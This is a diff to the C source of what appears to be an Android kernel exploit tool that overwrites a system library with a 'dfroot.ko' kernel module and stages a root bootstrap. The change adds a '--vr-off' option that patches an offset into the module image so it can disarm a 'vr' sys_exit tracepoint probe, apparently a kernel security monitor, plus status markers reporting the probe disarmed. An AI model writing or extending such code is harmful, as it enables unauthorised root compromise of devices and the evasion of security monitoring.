@@ -25,6 +25,7 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static unsigned long long g_vr_off;   /* W1c funcs offset, 0 = stage off */
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -358,6 +359,28 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+
+    /* W1c config: locate the DF_VR_MAGIC slot in the module image and write
+     * the user-supplied funcs offset right after it (df_vr_cfg[1]). The
+     * magic sits in a global volatile array, so its image offset is stable
+     * regardless of where the loader maps the module. */
+    if (g_vr_off) {
+        static const unsigned char magic[8] =
+            { 0x16, 0xFF, 0xC0, 0xDF, 0x16, 0xFF, 0xC0, 0xDF };
+        int done = 0;
+        for (size_t i = 0; i + 16 <= len && !done; i++) {
+            if (memcmp(buf + i, magic, 8) == 0) {
+                unsigned long long v = g_vr_off;
+                memcpy(buf + i + 8, &v, 8);
+                printf("vr: cfg patched, funcs offset %llu (slot @%#zx)\n",
+                       g_vr_off, i);
+                done = 1;
+            }
+        }
+        if (!done)
+            printf("vr: WARNING - ko has no vr config slot, W1c skipped\n");
+    }
+
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
@@ -476,7 +499,8 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX"
+            " [--vr-off N]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -495,6 +519,8 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--vr-off") && i + 1 < argc)
+            g_vr_off = strtoull(argv[++i], NULL, 0);  /* dec or 0x hex */
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -516,6 +542,8 @@ static int setup(int argc, char **argv) {
     printf("found ko_target: %s\n", ko_target);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
+    if (g_vr_off)
+        printf("vr funcs offset: %llu\n", g_vr_off);
     return 0;
 }
 
@@ -543,6 +571,8 @@ static int exploit(void) {
     } markers[] = {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/dfvr0", "vr: sys_exit probe disarmed (funcs = NULL)",       -1 },
+        { "/dev/dfvre", "vr: W1c FAILED - tracepoint/offset mismatch, vr intact", -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
